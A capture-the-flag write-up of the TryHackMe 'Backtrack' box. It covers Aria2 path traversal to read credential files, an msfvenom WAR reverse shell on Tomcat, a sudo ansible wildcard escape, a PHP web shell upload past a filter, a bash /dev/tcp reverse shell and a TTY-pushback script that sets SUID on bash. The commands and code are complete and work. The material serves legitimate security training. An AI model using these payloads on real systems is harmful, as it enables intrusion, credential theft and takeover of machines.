---
title: "TryHackMe - Backtrack"
author: Nasrallah
description: ""
date: 2024-10-15 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, medium, lfi, sudo, wildcard, cve, tomcat, cronjob]
img_path: /assets/img/tryhackme/backtrack
image:
    path: backtrack.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

[Backtrack](https://tryhackme.com/room/backtrack) from [TryHackMe](https://tryhackme.com/signup?referrer=603949780215185dfb191142) revolves around `../`, from lfi to file upload down to wild card exploit, nothing else to say besides that it's a wonderful box where you will learn new things.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.6.84                                                                                                                                                               
Host is up (0.10s latency).                                                                    
Not shown: 997 closed tcp ports (reset)                                                        
PORT     STATE SERVICE         VERSION                                                         
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:                                                                                 
|   3072 55:41:5a:65:e3:d8:c2:4f:59:a1:68:b6:79:8a:e3:fb (RSA)            
|   256 79:8a:12:64:cc:5c:d2:b7:38:dd:4f:07:76:4f:92:e2 (ECDSA)           
|_  256 ce:e2:28:01:5f:0f:6a:77:df:1e:0a:79:df:9a:54:47 (ED25519)
8080/tcp open  http            Apache Tomcat 8.5.93
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.93
8888/tcp open  sun-answerbook?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Sat, 12 Oct 2024 09:55:21 GMT
|     Connection: close
```

We found 3 open port, 22 running ssh as usual, 8080 us running tomcat 8.5 and 8888 seems to be another http server.

### Web

We start with the website on port 8888.

![firstweb](1.png)

It's `Aria2 WebUI`, going to settings -> server info we find the version.

![version](2.png)

The version running is `1.35.0`

Searching on google for exploits on this version we find that it is vulnerable to `Path traversal` [CVE-2023-39141](https://nvd.nist.gov/vuln/detail/CVE-2023-39141)

We find the following [poc](https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e) which uses `curl` to read the passwd file.

```bash
curl --path-as-is http://localhost:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
```

Let's replicate the exploit.

```terminal
┌─[]─[10.9.1.8]─[sirius@parrot]─[~/ctf/thm/backtrack]
└──╼ [★]$ curl --path-as-is http://10.10.76.96:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
[...]
tomcat:x:1002:1002::/opt/tomcat:/bin/false
orville:x:1003:1003::/home/orville:/bin/bash
wilbur:x:1004:1004::/home/wilbur:/bin/bash
```

It worked and we managed to read the `passwd` file.

I tried searching for private ssh keys but no luck with that.

Since Tomcat is running on port 8080, we can try reading the credentials file `tomcat-users.xml`.

From the passwd file we see that tomcat is located at the `/opt` directory, so the file should be at `/opt/tomcat/conf/tomcat-users.xml`

```terminal
┌─[]─[10.9.1.8]─[sirius@parrot]─[~/ctf/thm/backtrack]
└──╼ [★]$ curl --path-as-is http://10.10.76.96:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

  <role rolename="manager-script"/>
  <user username="tomcat" password="OP[REDACTED]fr" roles="manager-script"/>

</tomcat-users>
```

We got the password of tomcat, let's authenticate.

![tomcat](3.png)

We got access denied.

## **Foothold**

There is another way to exploit tomcat and it is through the command line.

First we need to generate a malicious `.war` file using msfvenom

```terminal
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```

We upload the file with `curl` using the following command:

```bash
curl --upload-file revshell.war -u 'tomcat:OP[REDACTED]fr' "http://10.10.76.96:8080/manager/text/deploy?path=/shell"
```

We setup a listener and trigger the reverse shell with the following command:

```bash
curl http://10.10.76.96:8080/shell/
```

![shell](4.png)

## **Privilege Escalation**

### tomcat --> wilbur

First let's get a stable shell with python pty.

```terminal
python3 -c 'import pty; pty.spawn("/bin/bash")'
tomcat@Backtrack:/$ export TERM=xterm
export TERM=xterm
tomcat@Backtrack:/$ ^Z
[1]+  Stopped                 nc -lvnp 9001
┌─[]─[10.9.1.8]─[sirius@parrot]─[~/ctf/thm/backtrack]
└──╼ [★]$ stty raw -echo ;fg
nc -lvnp 9001

tomcat@Backtrack:/$
```

Running `sudo -l` we find this:

```terminal
tomcat@Backtrack:/$ sudo -l
Matching Defaults entries for tomcat on Backtrack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on Backtrack:
    (wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml
```

We can run ansible scripts as user `wilbur`, the yml file we can run are located in the `/opt/test_playbooks`.

```terminal
tomcat@Backtrack:/opt/test_playbooks$ ls -la
total 16
drwxr-xr-x 2 wilbur wilbur 4096 Mar  9  2024 .
drwxr-xr-x 5 root   root   4096 Mar  9  2024 ..
-rw-rw-r-- 1 wilbur wilbur  340 Oct 12  2023 failed_login.yml
-rw-rw-r-- 1 wilbur wilbur  532 Oct 13  2023 suspicious_ports.yml
tomcat@Backtrack:/opt/test_playbooks$
```

We don't have any write permissions over this, but there is a wildcard `*` on the sudo command which means we can use `../` and change the directory.

Going to [GTFOBins](https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo) we can find how to exploit sudo ansible.

![gtfobing](5.png)

We need to create a malicious yml file using the following command:

```bash
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > /tmp/shell.yml
```

We give the file 777 permission and run the sudo command.

```bash
chmod 777 /tmp/shell.yml
sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/shell.yml`
```

```terminal
tomcat@Backtrack:/$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > /tmp/shell.yml
tomcat@Backtrack:/$ chmod 777 /tmp/shell.yml
tomcat@Backtrack:/$ sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/shell.yml
[WARNING]: provided hosts list is empty, only localhost is available. Note that
the implicit localhost does not match 'all'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-                                             
packages/ansible/plugins/connection/httpapi.py) as it seems to be invalid:                     
module 'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist
[...]
PLAY [localhost] ***************************************************************

TASK [Gathering Facts] *********************************************************
ok: [localhost]

TASK [shell] *******************************************************************
$ id
uid=1004(wilbur) gid=1004(wilbur) groups=1004(wilbur)
```

We got wilbur shell

### wilbur --> orville

Checking wilbur's home directory we find some interesting files.

```terminal
wilbur@Backtrack:~$ ls -la
total 28
drwxrwx--- 3 wilbur wilbur 4096 Oct 14 09:49 .
drwxr-xr-x 4 root   root   4096 Mar  9  2024 ..
drwxrwxr-x 3 wilbur wilbur 4096 Oct 14 09:49 .ansible
lrwxrwxrwx 1 root   root      9 Mar  9  2024 .bash_history -> /dev/null
-rw-r--r-- 1 wilbur wilbur 3771 Mar  9  2024 .bashrc
-rw------- 1 wilbur wilbur   48 Mar  9  2024 .just_in_case.txt
lrwxrwxrwx 1 root   root      9 Mar  9  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 wilbur wilbur 1010 Mar  9  2024 .profile
-rw------- 1 wilbur wilbur  461 Mar  9  2024 from_orville.txt
wilbur@Backtrack:~$ cat from_orville.txt 
Hey Wilbur, it's Orville. I just finished developing the image gallery web app I told you about last week, and it works just fine. However, I'd like you to test it yourself to see if everything works and secure.
I've started the app locally so you can access it from here. I've disabled registrations for now because it's still in the testing phase. Here are the credentials you can use to log in:

email : orville@backtrack.thm
password : W3[REDACTED]l$
wilbur@Backtrack:~$ cat .just_in_case.txt 
in case i forget :

wilbur:mY[REDACTED]KF
wilbur@Backtrack:~$
```

The first file is from `orville` telling us that there is a website running locally and he gave us credentials for it.

```terminal
wilbur@Backtrack:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:6800            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::8888                 :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
tcp6       0      0 :::6800                 :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.76.96:68          0.0.0.0:*         
```

The port 80 is open.

The second file contains wilbur's credentials, we can use that to port forward the web server using ssh.

```terminal
ssh -L 8000:127.0.0.1:80 wilbur@10.10.76.96 -fN
```

Now we navigate to `http://127.0.0.1:8000`

![gallery](6.png)

Let's login using orville's credentials.

![logge](7.png)

We have a file upload here, let's upload a php reverse shell. I'll be using [p0wny's shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php)

![upload](8.png)

There is a filter in place here.

After some trial and error on burp suite I managed to upload the shell with the name `p0wny.png.php`

![burp](9.png)

With this we know two things, the server is using a white list filter but it's checking what comes after the first dot. And the uploaded file are located in `/uploads` folder.

Requesting the file on `/uploads/p0wny.png.php` doesn't run it but downloads it.

We can do another path traversal here and try to upload it to the parent directory.

Using the name `%25%32%65%25%32%65%25%32%66p0wny.png.php` we succeed in uploading it to `../uploads`

`%25%32%65%25%32%65%25%32%66` is a double url encode of `../`

![burp](10.png)

Now we can navigate to `/p0nwy.png.php` and get the shell

![p0wny](11.png)

To get a reverse shell we run the following command:

```bash
bash -c '/bin/bash -i >& /dev/tcp/10.9.1.8/9001 0>&1'
```

### orville --> root

Checking orville home directory we find a zip file that was recently created.

```terminal
orville@Backtrack:/home/orville$ ls -la
total 64
drwxrwx--- 2 orville orville  4096 Oct 14 11:16 .
drwxr-xr-x 4 root    root     4096 Mar  9  2024 ..
lrwxrwxrwx 1 root    root        9 Mar  9  2024 .bash_history -> /dev/null
-rw-r--r-- 1 orville orville  3771 Mar  9  2024 .bashrc
lrwxrwxrwx 1 root    root        9 Mar  9  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 orville orville   807 Mar  9  2024 .profile
-rw------- 1 orville orville    38 Mar  9  2024 flag2.txt
-rwx------ 1 orville orville 42854 Oct 14 11:16 web_snapshot.zip
```

This mean there is a cronjob running, and from inspecting the zip file we find it has /var/www/html files, and it also contains our p0wny shell.

So we can safely say that there is a cronjob backing up the web server files.

Let's run `pspy64` and see what's going on.

![pspy64](12.png)

Here we see something interesting. the root user is switching to user `orville` with the command: `su - orville`.

This can result to a vulnerability called [TTY Pushback](https://www.errno.fr/TTYPushback.html), for more information check the article <https://www.errno.fr/TTYPushback.html>

To exploit it we can use the following script:

```python
import fcntl
import os
import termios

def inject_commands():
    command_sequence = "exit\n/bin/bash -c 'chmod u+s /bin/bash'\n"
    
    for char in command_sequence:
        try:
            ret = fcntl.ioctl(0, termios.TIOCSTI, char)
            if ret == -1:
                print("Error: ioctl()")
        except OSError as e:
            print(f"Error: ioctl() - {e}")

if __name__ == "__main__":
    inject_commands()
```

This script when executed gives /bin/bash the suid bit.

But it needs to get execute when root changes to orville user. To do that we write it in the `.bashrc` file.

```bash
echo 'python3 /home/orville/exploit.py' >> /home/orville/.bashrc
```

```terminal
orville@Backtrack:~$ pwd
/home/orville
orville@Backtrack:~$ vim exploit.py
orville@Backtrack:~$ cat exploit.py
import fcntl
import os
import termios

def inject_commands():
    command_sequence = "exit\n/bin/bash -c 'chmod u+s /bin/bash'\n"
    
    for char in command_sequence:
        try:
            ret = fcntl.ioctl(0, termios.TIOCSTI, char)
            if ret == -1:
                print("Error: ioctl()")
        except OSError as e:
            print(f"Error: ioctl() - {e}")

if __name__ == "__main__":
    inject_commands()

orville@Backtrack:~$ chmod +x exploit.py 
orville@Backtrack:~$ echo 'python3 /home/orville/exploit.py' >> /home/orville/.bashrc
orville@Backtrack:~$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
orville@Backtrack:~$ ls -l /bin/bash
```

Now we wait a little bit and check `/bin/bash` again, we find it has the suid bit

```terminal
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Now we run `/bin/bash -p` to get a root shell.

```terminal
orville@Backtrack:~$ /bin/bash -p
bash-5.0# cd /root
bash-5.0# whoami
root
bash-5.0# cat flag3.txt 

██████╗░░█████╗░░█████╗░██╗░░██╗████████╗██████╗░░█████╗░░█████╗░██╗░░██╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
██████╦╝███████║██║░░╚═╝█████═╝░░░░██║░░░██████╔╝███████║██║░░╚═╝█████═╝░
██╔══██╗██╔══██║██║░░██╗██╔═██╗░░░░██║░░░██╔══██╗██╔══██║██║░░██╗██╔═██╗░
██████╦╝██║░░██║╚█████╔╝██║░╚██╗░░░██║░░░██║░░██║██║░░██║╚█████╔╝██║░╚██╗
╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝


```

And just like that we got root

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References

<https://nvd.nist.gov/vuln/detail/CVE-2023-39141>

<https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e>

<https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo>

<https://www.errno.fr/TTYPushback.html>
